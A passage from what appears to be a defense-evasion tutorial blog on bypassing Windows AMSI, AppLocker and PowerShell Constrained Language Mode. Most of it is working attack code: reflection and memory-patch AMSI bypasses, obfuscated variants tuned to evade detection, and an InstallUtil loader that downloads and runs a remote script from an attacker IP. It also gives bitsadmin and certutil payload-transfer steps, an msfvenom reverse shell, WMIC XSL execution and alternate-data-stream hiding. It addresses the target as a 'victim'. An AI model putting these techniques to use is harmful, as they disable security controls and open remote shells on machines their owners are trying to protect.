:\n\n1. The type `AmsiUtils` is successfully retrieved from the assembly, indicating that AMSI is present and recognized.\n2. Since `AmsiUtils` is not public, it suggests that the class is intended for internal use within the .NET assembly.\n3. The type inherits from `System.Object`, which is typical for most classes in .NET\n\n* $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')\n\nLet's see it in a good way without variables\n\n\n```powershell\n$field = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed', 'NonPublic,Static')\n```\n\nThis line retrieves the field `amsiInitFailed` from the `AmsiUtils` type. The `NonPublic` and `Static` flags indicate that it is a non-public (private or protected) static field.\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def2.png\" alt=\"\"></figure>\n\n\n* $field.SetValue($null,$true)\n\nLet's see it in a good way without variables\n\n\n```powershell\n[Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)\n```\n\nBy setting the value of the `amsiInitFailed` field to `true`, the script tricks PowerShell into believing that <span style=\"color:yellow\">AMSI failed to initialize properly</span>. As a result, PowerShell skips or disables AMSI's scanning functionality.\n\nNice now we break it let's see bypass the AMSI\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def3.png\" alt=\"\"></figure>\n\n\nWe filed! , That's okay\n\n[This command is very popular in AMSI bypass](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) so it's regular to be detected\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def4.png\" alt=\"\"></figure>\n\n### Obfuscation\n\nObfuscation in AMSI bypass refers to techniques used to <span style=\"color:yellow\">conceal or disguise the code that performs the AMSI bypass</span>. The purpose is to make the bypass harder to detect by security software and reverse engineers, I will show u some ways that u can use Obfuscation to bypass\n\n#### String Splitting and Concatenation\n\nWe tested it before in our last example but let us make it work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def5.png\" alt=\"\"></figure>\n\n\nLet's use [AMSITrigger](https://github.com/RythmStick/AMSITrigger) to see why we are blocked from [Bitdefender](https://www.bitdefender.com/)\n\nMake an exception for ur dir to test the scripts\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def6.png\" alt=\"\"></figure>\n\nOkay now we know where is the AMSI detect us let's see how we can bypass it , We see it from the last example so i don't need to explain what i do again\n\nfrom\n\n```powershell\n$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils');\n$Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);\n```\n\nTo\n\n```powershell\n$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n$field = $assembly.GetField(('am{0}InitFailed' -f \n$c),'NonPublic,Static')\n$field.SetValue($null,$true)\n```\n\nLet's see if this work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def7.png\" alt=\"\"></figure>\n\nThe AMSI told us it's clean but we are still on the radar , It doesn't work again !!\n\nSo i try to use more variables and concatinate them\n\n```powershell\n$namespace = 'System.Management.Automation'\n$classPrefix = 'A'\n$propertyName = 'InitFailed'\n$visibility = 'NonPublic,Static'\n$w = \"$namespace.$classPrefix\" # System.Management.Automation.A \n$c = 'si'\n$m = 'Utils'\n$fullClassName = '{0}m{1}{2}' -f $w, $c, $m #System.Management.Automation.AmsiUtils\n$assembly = [Ref].Assembly.GetType($fullClassName)\n$propertyFullName = 'am{0}{1}' -f $c, $propertyName\n$field = $assembly.GetField($propertyFullName, $visibility)\n$field.SetValue($null, $true)\n```\n\nLet's try to check this out with [gocheck](https://github.com/gatariee/gocheck) and see if it works\n\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def8.png\" alt=\"\"></figure>\n\nIt doesn't work again, Am...\n\nAt this time I refused to move forward and try to learn other methods and combine them to bypass so I scratched my head and got a good idea\n\nWe can use <span style=\"color:yellow\">environment variables</span> to evade detection by the antivirus , Let's craft our script\n\nSo I decided to write a PowerShell script That retrieves all environment variables to search for every word that I entered to get it immediately as a variable you can use it from my GitHub repo from [here](https://github.com/N1NJ10/Bad_Scripts/blob/main/PowerShell/Envrandomizer.ps1)\n\n> The idea behinde this sript come to me after seeing [Daniel Bohannon](https://www.youtube.com/watch?v=-j7zzUwB_-E&t=414s) explaining Invoke-CradleCrafter\n\nWith this script, i can craft our payload in a new way\n\n```\n# Extract characters from system environment variables to form \"system\"\n$s1 = [Environment]::GetEnvironmentVariable('DriverData')[11]  # 'S'\n$s2 = [Environment]::GetEnvironmentVariable(\"COMSPEC\")[12]  # 'y'\n$s3 = [Environment]::GetEnvironmentVariable(\"ComSpec\")[9] # 's'\n$s4 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12] # 't'\n$s5 = [Environment]::GetEnvironmentVariable(\"HOMEPATH\")[3]  # 'e'\n$s6 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[9]  # 'm'\n\n$s = \"$s1$s2$s3$s4$s5$s6\" # \"System\"\n\n# Extract characters from system environment variables to form \"Management\"\n$m1 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[137]  # 'M'\n$m2 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[8]  # 'a'\n$m3 = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[22]  # 'n'\n$m4 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[8]  # 'a'\n$m5 = [Environment]::GetEnvironmentVariable(\"ProgramFiles(x86)\")[6]  # 'g'\n$m6 = [Environment]::GetEnvironmentVariable(\"HOMEPATH\")[3]  # 'e'\n$m7 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[9]  # 'M'\n$m8 = [Environment]::GetEnvironmentVariable(\"HOMEPATH\")[3]  # 'e'\n$m9 = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[22] # 'n'\n$mx = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12] # 't'\n\n$m = \"$m1$m2$m3$m4$m5$m6$m7$m8$m9$mx\" # \"Management\"\n\n# Extract characters from system environment variables to form \"Automation\"\n$a1 = [Environment]::GetEnvironmentVariable('APPDATA')[15]  # 'A'\n$a2 = [Environment]::GetEnvironmentVariable('FPS_BROWSER_USER_PROFILE_STRING')[4]  # 'u'\n$a3 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'\n$a4 = [Environment]::GetEnvironmentVariable(\"windir\")[7]  # 'o'\n$a5 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[9]  # 'm'\n$a6 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[8]  # 'a'\n$a7 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'\n$a8 = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[12]  # 'i'\n$a9 = [Environment]::GetEnvironmentVariable(\"windir\")[7]  # 'o'\n$ax = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[22]  # 'n'\n$a = \"$a1$a2$a3$a4$a5$a6$a7$a8$a9$ax\"  # \"Automation\"\n\n# Extract characters from system environment variables to form \"Amsi\"\n$am0 =  [Environment]::GetEnvironmentVariable(\"TEMP\")[4] + [Environment]::GetEnvironmentVariable(\"PUBLIC\")[13] # 'si'\n$am1 = [Environment]::GetEnvironmentVariable('APPDATA')[15]  # 'A'\n$am2 = [Environment]::GetEnvironmentVariable(\"TEMP\")[9]  # 'm'\n$am3 = [Environment]::GetEnvironmentVariable(\"TEMP\")[4]  # 's'\n$am4  = [Environment]::GetEnvironmentVariable(\"PUBLIC\")[13]  # 'i'\n$am = \"$am1$am2$am3$am4\"  # \"Amsi\"\n\n# Extract characters from system environment variables to form \"Utils\"\n$u1 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[3]  # 'U'\n$u2 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'\n$u3 = [Environment]::GetEnvironmentVariable(\"PUBLIC\")[13]  # 'i'\n$u4 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[40]  # 'l'\n$u5 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[49]  # 's'\n$u = \"$u1$u2$u3$u4$u5\"  # \"Utils\"\n\n# Construct the type name for AMSI Utils\n$typeName = \"$s.$m.$a.$am$u\"  # \"System.Management.Automation.AmsiUtils\"\n\n# Get the AMSI Utils type\n$assembly = [Ref].Assembly.GetType($typeName)\n\n# Get the 'amsiInitFailed' field\n\n$field = $assembly.GetField(('am{0}InitFailed' -f $am0), 'NonPublic,Static')\n\n# Set the 'amsiInitFailed' field to true\n$field.SetValue($null, $true)\n```\n\nThat's nice let's try it\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def9.png\" alt=\"\"></figure>\n\n> **Remove the comments** to avoid detecting i just put them for u to understand what I do\n{: .prompt-tip }\n\nBypassed ! , Yeah we did it together mate be creative in ur thoughts and u will see magic , Let's see other methods\n\n> Bypassing AMSI does not necessarily bypass all antivirus protections. Modern antivirus solutions employ multiple layers of defense, including behavioral analysis and heuristics, which can still detect and block malicious activities even if AMSI is bypassed.\n{: .prompt-info }\n\n#### Base64 Encoding\n\nOf course, encoding will get into the game, Let's see how to use it\n\n```powershell\n$command = 'hostname'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\nWrite-Output $encodedCommand\n\n$decodedBytes = [Convert]::FromBase64String($encodedCommand)\n$decodedCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)\nInvoke-Expression $decodedCommand\n```\n\nThis example takes a command [ hostname ] and encodes it to base64 then decodes and execute it this is the same method that we will be using\n\n> [Why do we use bytes no encode and decode directly ?](https://stackoverflow.com/questions/3538021/why-do-we-use-base64)\n>\n> This is necessary because Base64 operates on byte data. Strings are sequences of characters, which must be converted to bytes for Base64 encoding.\n{: .prompt-info }\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def10.png\" alt=\"\"></figure>\n\n\nLet's see how to use it in our script\n\nfrom\n\n```powershell\n$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils');\n$Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);\n```\n\n[To](https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/)\n\n```powershell\n[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)\n```\n\nLet's see if this work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def11.png\" alt=\"\"></figure>\n\nAgain we bypassed the AMSI with the Base64-encoded payload\n\nThere is many obfuscation methods left , I will leave u some resources at the end of the post to check them out and try to make one of them work with u consider it as a task\n\n### Memory Patch\n\nThe idea behind this bypass is to force <span style=\"color:yellow\">AmsiScanBuffer to return AMSI\\_RESULT\\_CLEAN</span>. The general idea is to import API calls and then return a specific value to the AmsiScanBuffer() call: 0x80070057. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double add operand and successfully bypass the control. The code for this is as follows:\n\n\n```powershell\n$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Win32\n$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)\n$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))\n$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)\n$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)\n#0:  31 c0                   xor    eax,eax\n#2:  05 78 01 19 7f          add    eax,0x7f190178\n#7:  05 df fe ed 00          add    eax,0xedfedf\n#c:  c3                      ret \n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)\n```\n\nLet's try it\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def12.png\" alt=\"\"></figure>\n\nAgain we bypassed the AMSI\n\n>If u wanna deep dive into this u can write this [writeup](https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)\n{: .prompt-tip }\n\n## AppLocker and Powershell CLM\n\nApplocker is a white-listing solution With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: **by Name, Path, Publisher, or Hash** , you can use rules to enforce it to Allow and deny as I will show you\n\nPowerShell Constrained Language Mode [ CLM ] is a [language mode](https://devblogs.microsoft.com/powershell/a-comparison-of-shell-and-scripting-language-security/) of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs , So why this for ?\n\nBecause it's an incredibly effective way to drastically reduce the risk of viruses, ransomware, and unapproved software. For DeviceGuard UMCI the approved applications are determined via a UMCI policy. PowerShell automatically detects when a UMCI policy is being enforced on a system and will run only in Constrained Language mode. So PowerShell Constrained Language mode becomes more interesting when working in conjunction with system-wide lockdown policies.\n\n>Local Account Syntax: The general syntax for logging in with a local account is `.\\username`\n{: .prompt-tip }\n\nNow we know what is Applocker & PowerShell Constrained Language Mode let's see how to use them, I need you to follow this [guide](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)\n\nLet's setup our enviroment :\n\nFirst we need to configure the Applocker policy from LocalGroupPolicy -> Computer Configration -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker\n\nThen i need you to follow the pervious blog and create 2 rules :\n\n* Rule Path to run only executables from the C:\\Windows\\*\n* block the [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) by the hash\n\nThen generate the default creds for the Script Rules to apply the Constrained Language Mode\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def13.png\" alt=\"\"></figure>\n\n\nIf you follow the rules you should see something like this !\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def15.png\" alt=\"\"></figure>\n\n> This is from [Rudy Ooms](https://patchmypc.com/blog/windows-11-24h2-applocker-powershell-constrained-language-broken/) :\n>\n>But How PowerShell Determines Language Mode Based on AppLocker Script Rules ??\n>\n>When PowerShell starts, it checks whether [AppLocker Script Enforcement](https://call4cloud.nl/deploying-applocker-intune-powershell/) Rules are present. It does this by simulating the execution of a test PowerShell script placed in the user‚Äôs temporary folder and evaluating it against the system‚Äôs policies. As shown below, the DLL (System.Management.Automation.dll) responsible for PowerShell shows this behavior.\n><figure><img src=\"/images/site/posts/DefenseEvasion/def16.png\" alt=\"\"></figure>\n>This means that if AppLocker‚Äôs rules block or restrict the test PS1 file, PowerShell automatically switches into Constrained Language Mode.\n><figure><img src=\"/images/site/posts/DefenseEvasion/def17.png\" alt=\"\"></figure>\n>If no restrictions apply, PowerShell Scripts will be executed in full language mode. This automatic detection has worked reliably for years and has been a simple way to enforce script safety without needing extra configuration inside PowerShell itself.\n{: .prompt-tip }\n\nBut is this a good security approach , It depends on the quality of the rules we are implementing\n\nCan you disable the Applocker ? ( **Matio here is an administrator** )\n\nFor the first look you can say yes if we are an administrators but seems it doesn't work like this\n\nLet's first talk about the PPL (Protected Process Light) : The PLL is a security feature in Windows that protects critical system processes like antivirus engines, security services, and system integrity components from being **tampered with**, even by **administrators or SYSTEM-level accounts**.\n\nSo Let's try to disable the AppLocker\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def18.png\" alt=\"\"></figure>\n\nEven with the System account\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def19.png\" alt=\"\"></figure>\n\n>By the way  [tiraniddo](https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html) here found a way to disable the AppLocker with the TrustedInstaller account :\n>```powershell\n$a = New-ScheduledTaskAction -Execute cmd.exe -Argument \"/C sc.exe config appidsvc start= demand && sc.exe stop appidsvc\"\nRegister-ScheduledTask -TaskName 'TestTask' -TaskPath \\ -Action $a\n$svc = New-Object -ComObject 'Schedule.Service'\n$svc.Connect()\n$user = 'NT SERVICE\\TrustedInstaller'\n$folder = $svc.GetFolder('\\')\n$task = $folder.GetTask('TestTask')\n$task.RunEx($null, 0, 0, $user)\n```\n{: .prompt-tip }\n\n### Path / Hash restrictions bypass\n\nIn this scenario, i will show you how we can bypass the Path / Hash restrictions by moving the file to an allowed executable path and changing the file wish to lead to changing the whole hash\n\nFirst we will see what directories that our permession to the subdirectories of the main dir that we can run exe files from it\n\nThen we will edit the file hash , Seems this will make will work\n\n```powershell\nPS C:\\Users\\matio> Get-ChildItem C:\\Windows\\ -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $dir = $_; try { (Get-Acl $dir.FullName -ErrorAction SilentlyContinue).Access | Where-Object { $_.AccessControlType -eq \"Allow\" -and ($_.IdentityReference.Value -eq \"NT AUTHORITY\\Authenticated Users\" -or $_.IdentityReference.Value -eq \"BUILTIN\\Users\") -and (($_.FileSystemRights -like \"*Write*\" -or $_.FileSystemRights -like \"*Create*\") -and $_.FileSystemRights -like \"*Execute*\") } | ForEach-Object { Write-Host ($dir.FullName + \": \" + $_.IdentityReference.Value + \" (\" + $_.FileSystemRights + \")\") } } catch {} }\nC:\\Windows\\Tasks: NT AUTHORITY\\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)\nC:\\Windows\\tracing: BUILTIN\\Users (Write, ReadAndExecute, Synchronize)\nC:\\Windows\\System32\\spool\\drivers\\color: BUILTIN\\Users (CreateFiles, ReadAndExecute, Synchronize)\nPS C:\\Users\\matio> cp .\\Downloads\\nc64.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\nPS C:\\Users\\matio> & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\nProgram 'nc64.exe' failed to run: This program is blocked by group policy. For more information, contact your system\nadministratorAt line:1 char:1\n+ & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.\nAt line:1 char:1\n+ & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n\nPS C:\\Users\\matio> echo \"N1NJ10\" >> C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\nPS C:\\Users\\matio> & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -l -p 7777\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def20.png\" alt=\"\"></figure>\n\n\n### InstallUtil - Shell ( Updated Part )\n\nThere is a bypass technique that usess the [Installutil](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool) , My first time to see it from [pentestlab](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/) i reccomed u to read this before contiue\n\nAs we know now , when can use installutil to run an exe files inside them to bypass the applocker rules ( Since this utility is a <span style=\"color:yellow\">Microsoft signed binary</span> then it could be used to run any .NET executables bypassing in that way AppLocker restrictions. Also this utility is <span style=\"color:yellow\">located inside the Windows directory</span> which AppLocker policies are not going to be applied as the contents of the Windows folder are needed to be executed in order for the system to run normally ) and bypass the CLM lang ( InstallUtil <span style=\"color:yellow\">executes the code in a .NET context, not PowerShell, avoiding CLM restrictions</span>. ) , okey let's see how we can exploit this using this code\n\n\n```powershell\nusing System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Configuration.Install;\n\nnamespace BypassCLM\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            Console.WriteLine(\"This is vairous , ru kidding !!!! \");\n        }\n    }\n\n    [System.ComponentModel.RunInstaller(true)]\n    public class Sample : System.Configuration.Install.Installer\n    {\n        public override void Uninstall(System.Collections.IDictionary savedState)\n        {\n           string amsiBypass = @\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\";\n           string cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.99.21:8080/a9kMET')\";\n\n           Runspace rs = RunspaceFactory.CreateRunspace();\n           rs.Open();\n           PowerShell ps = PowerShell.Create();\n           ps.Runspace = rs;\n           ps.AddScript(amsiBypass); // First, bypass AMSI\n           ps.Invoke();\n           ps.AddScript(cmd); // Then, execute the downloaded script\n           ps.Invoke();\n           rs.Close();\n        }\n    }\n}\n```\n\nCreate ur reverse shell and change the cmd variable ( u can do it with metasploit or any other c2 ) and the amsiBypass also , Then compile it with the .Net [csc.exe](https://dotnet.microsoft.com/en-us/download/dotnet-framework) binary\n\n\n```powershell\n& C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /reference:\"C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\" /out:Bypass.exe BypassCLM.cs\ncertutil -encode Bypass.exe bypass.txt\n```\n\nThen run your [RangeHTTPServer](https://github.com/danvk/RangeHTTPServer) ( **Not http** )\n\n\n```bash\npython3 -m RangeHTTPServer 1234\n```\n\nThen go to your victum and excute those commands\n\n```powershell\nbitsadmin /transfer Bad_Work http://192.168.99.21/bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt\ncertutil -decode C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe\n& C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe\n```\n\nIf you follow those steps you should get the shell\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def21.png\" alt=\"\"></figure>\n\n\n### WMIC ( Updated Part )\n\nThere is a small trick when u can use a wmic to bypass this restrictions , I try this one on a ctf on hackthebox you can use this xsl file ( Change the reverse shell ) :\n\n```powershell\n<?xml version='1.0'?>\n<stylesheet version=\"1.0\"\nxmlns=\"http://www.w3.org/1999/XSL/Transform\"\nxmlns:ms=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"http://mycompany.com/mynamespace\">\n<output method=\"text\"/>\n        <ms:script implements-prefix=\"user\" language=\"JScript\">\n                <![CDATA[\n                        var r = new ActiveXObject(\"WScript.Shell\");\n                        r.Run(\"powershell.exe -nop -w hidden -e xxxxxxxxxxxxxxxxxx=\");\n                ]]>\n        </ms:script>\n</stylesheet>\n```\n\nThen you can get the file from the server or download and excute it\n\n\n```powershell\nwmic process get brief /format:\"rev.xsl\"\nwmic process get brief /format:\"http://192.168.99.21:1234/rev.xsl\"\n```\n\n>There is more ways you can test from here :\n>* [snovvcra.sh](https://ppn.snovvcra.sh/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass)\n>* [itm4n](https://itm4n.github.io/reinventing-powershell/#constrained-language-mode-clm)\n>* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)\n{: .prompt-tip }\n\n\n### Alternate Data Stream\n\n[OWASP](https://owasp.org/www-community/attacks/Windows_alternate_data_stream) said The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called `:$DATA`\n\nSo we can hide a data stream in any file without the user even konw !!\n\nSo let's first create our reverse shell\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.21 LPORT=7771 -a x64 --platform Windows -f exe -o rev_shell.exe\n```\n\nThen transfer the file to the victum machine and embaded it into another file ( **Run this from the cmd** )\n\n```powershell\ntype C:\\Users\\matio\\Desktop\\rev_shell.exe > \"C:\\Users\\matio\\Desktop\\test.txt -Stream rev_shell.exe\"\n\nwmic process call create '\"test.txt:rev_shell.exe\"'\n```\n\nThen it should be worked.\n\n## Powershell CLM Bypass\n\nLet's see if we can bypass the CLM , First let's see the LanguageMode we are using\n\n```powershell\n$ExecutionContext.SessionState.LanguageMode\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def22.png\" alt=\"\"></figure>\n\nThere is more than a way to Bypass the CLM\n\n### PowerShdll\n\nwe can Run PowerShell with rundll32. Bypass software restrictions using [PowerShdll](https://github.com/p3nt4/PowerShdll), so Let's see\n\n```powershell\nbitsadmin /transfer Bad_Work http://192.168.99.21:1234/PowerShdll_x64.dll C:\\Windows\\System32\\spool\\drivers\\color\\PowerShdll_x64.dl\nrundll32.exe PowerShdll_x64.dll,main -w\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def23.png\" alt=\"\"></figure>\n\n>You can try some other tools like [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM) or [bypass-clm](https://github.com/calebstewart/bypass-clm)\n{: .prompt-tip }\n\n### %TEMP%ORARY ( Updated Part )\n\nOne of the catchy methods to bypass the CLM language in powershell is this method\n\nRemmeber in the beggening of talking about the CLM i leave you with an important note by Rudy Ooms [ When PowerShell starts, it checks whether [**AppLocker Script Enforcement**](https://call4cloud.nl/deploying-applocker-intune-powershell/) Rules are present. It does this by simulating the execution of a test **PowerShell script placed in the user‚Äôs temporary** folder and evaluating it against the system‚Äôs policies. ] so why this important ?\n\nBy focus on this statment we should understand that , when a user open the powershell for the first time the system made a random powershell script in his temp dir ( Which are not in the dirs that can execute any binaries or powershell scripts ) and see if this user can execute this script or not\n\nIf yes okey make him in the FullLanguage mode if not change the language mode to ConstrainedLanguage , Okey what if we change the user temp dir in the enviroment to path that we have access and this path in the dirs that applocker permit them to run the executables and scripts from ( Like we do in the applocker bypass ) and start a new powershell session with those new env variables ?\n\nThis was [Oddvar](http://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/) idea so he make this script , let's test it and see if this sucess or not\n\n```powershell\n$CurrTemp = $env:temp\n$CurrTmp = $env:tmp\n$TEMPBypassPath = \"C:\\windows\\temp\"\n$TMPBypassPath = \"C:\\windows\\temp\"\n\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Tmp -Value \"$TEMPBypassPath\"\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Temp -Value \"$TMPBypassPath\"\n\nInvoke-WmiMethod -Class win32_process -Name create -ArgumentList \"powershell\"\nsleep 5\n\n#Set it back\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Tmp -Value $CurrTmp\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Temp -Value $CurrTemp\n\nOR the Cool one by Matt Graeber Note -> https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc\n\n#Path to Powershell\n$CMDLine = \"$PSHOME\\powershell.exe\"\n\n#Getting existing env vars\n[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\\* -Exclude \"TEMP\",\"TMP\"| % { \"$($_.Name)=$($_.Value)\" }\n\n#Custom TEMP and TMP\n$TEMPBypassPath = \"Temp=C:\\windows\\temp\"\n$TMPBypassPath = \"TMP=C:\\windows\\temp\"\n\n#Add the to the list of vars\n$EnvVarsExceptTemp += $TEMPBypassPath\n$EnvVarsExceptTemp += $TMPBypassPath\n\n#Define the start params\n$StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }\n$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties\n\n#Start a new powershell using the new params\nInvoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{\nCommandLine = $CMDLine\nProcessStartupInformation = $StartParams\n}\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def24.png\" alt=\"\"></figure>\n\n## PowerShell Logging\n\nPowerShell logging is the process of recording activities within PowerShell sessions, such as commands executed, scripts run, and their outputs or execution details. It is designed to support auditing, debugging, and security monitoring in Windows environments. The three primary logging types : \n\n* Transcription\n* Script Block Logging\n* Module Logging \n\nEach serves distinct purposes, capturing different levels of detail about PowerShell activities, so let us talk about them and their bypasses and how to configure them.\n\n### PowerShell Transcription\n\nThe Transcription loging records both input (commands typed) and output (responses shown) of PowerShell sessions, like a session transcript.\n\nLet's configure it from Local Group Policy -> Administrative Templates -> Windows Components -> Windows PowerShell Then navigate to PowerShell Transcription\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def25.png\" alt=\"\"></figure>\n\nLet's see how this work , you can run this script to know the Transcription are on or not\n\n```powershell\n$transcriptionSettings = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -ErrorAction SilentlyContinue\nif ($transcriptionSettings -and $transcriptionSettings.EnableTranscripting -eq 1) {\n    Write-Host \"Transcription logging is enabled.\"\n    if 